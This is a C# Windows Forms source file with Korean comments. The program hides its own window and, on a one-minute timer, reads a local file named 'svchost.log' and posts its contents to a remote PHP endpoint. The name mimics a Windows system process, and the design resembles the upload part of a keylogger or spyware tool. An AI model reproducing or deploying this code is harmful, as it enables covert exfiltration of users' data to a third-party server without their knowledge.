using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;

using System.Text;
using System.IO;

using System.Windows.Forms;
using System.Timers;
using System.Net;


namespace sendhttp
{
    public partial class Form1 : Form
    {
        static System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();

        private bool allowshowdisplay = false;

        public Form1()
        {
            InitializeComponent();


            // 1분에 한번씩 매일을 보냄.
            timer.Tick += new EventHandler(timer_Tick); // Everytime timer ticks, timer_Tick will be called
            timer.Interval = 60 * 1000;    // excute it per 1 min
            timer.Enabled = true;                       // Enable the timer
            timer.Start();


        }

        // hide window form
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(allowshowdisplay ? value : allowshowdisplay);
        }

        // 쓰레드풀의 작업쓰레드가 지정된 시간 간격으로
        // 아래 이벤트 핸들러 실행
        private void timer_Tick(object sender, EventArgs e)
        {
            // MessageBox.Show("timer success");
            
            string appPath = System.Environment.CurrentDirectory;
            appPath += "\\svchost.log";
            
            //FileStream fs = new FileStream(appPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            //StreamReader sr = new StreamReader(fs);
            string text = System.IO.File.ReadAllText(appPath);

            // MessageBox.Show(text);
            

            string URI = "http://www.kwabe.co.kr/post.php";
            string myParameters = "param1="+text;

            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                string HtmlResult = wc.UploadString(URI, myParameters);
            }
            MessageBox.Show(text);



        }

    }
}
